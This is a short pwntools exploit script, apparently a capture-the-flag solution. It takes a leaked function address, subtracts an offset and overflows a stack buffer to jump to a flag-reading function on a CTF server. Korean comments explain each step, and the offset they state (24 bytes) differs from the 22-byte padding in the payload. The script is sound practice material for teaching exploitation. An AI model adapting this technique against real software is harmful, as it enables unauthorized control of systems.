# -*- coding: utf-8 -*-
from pwn import * 

p = process("./bof_pie")
p = remote("ctf.j0n9hyun.xyz",3024)

# 메인함수가 실행되면, welcome 함수로 점프해서 동작을 수행한다.
# 거기서 입력도 받고, 여러가지 동작들도 한다. 
# 입력 시작 위치 0xffffd4a4 , eip 위치 0xffffd4bc 24바이트. 
# j0n9hyun 함수에서 flag파일을 읽어오는 동작을 하는걸 찾았다. 
# 프로그램 실행하면 해당 함수 주소값도 알려준다. bof 위치도 잡을수 있음. 
# 보니까 알려주는 주소가 welcome 주소다 jonghyun 함수 주소가아니고. 일정값을 뺴야될듯 
# 시작주소는 0x79바이트 만큼 차이가 나는게 확인된다. 
p.recvuntil("is ")
addr = int(p.recv(10),16)-0x79
log.info("func addr = "+hex(addr))

payload = "a"*22 + p32(addr)
pause()
p.sendline(payload)


p.interactive()

